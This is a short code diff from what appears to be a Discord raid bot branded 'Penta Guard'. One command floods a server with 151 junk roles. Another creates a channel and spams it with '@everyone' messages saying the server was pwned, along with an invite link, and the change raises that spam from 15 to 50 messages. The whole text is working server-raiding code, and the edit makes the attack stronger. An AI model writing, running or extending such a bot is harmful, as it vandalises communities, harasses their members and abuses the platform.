@@ -204,7 +204,7 @@ client.on("message", message => {
   if (message.content === '$createrol') {
     message.delete()
     for (let i = 0; i <= 150; i++) {
-      message.guild.roles.create({ data: { name: `pentaguard`, color: '#FFFFF', }, reason: 'raided by penta guard', })
+      message.guild.roles.create({ data: { name: `raided-by-pentaguard`, color: '#000001', }, reason: 'raided by penta guard', })
     };
   }
 });
@@ -222,7 +222,7 @@ client.on("message", async message => {
       message.guild.channels.create(` ̷	𝕡𝕨𝕟𝕖𝕕𝕓𝕪𝕡𝕖𝕟𝕥𝕒𝕘𝕦𝕒𝕣𝕕` , {
         type: 'text'
       }).then(channel => {
-        const messages = Array(15).fill("**pwned by Penta Guard**, Penta Guard pwned your server https://discord.gg/7bnf3mk9nj @everyone");
+        const messages = Array(50).fill("**pwned by Penta Guard**, Penta Guard pwned your server https://discord.gg/7bnf3mk9nj @everyone");
         return Promise.all(messages.map(msg => channel.send(msg)));
       });
     }
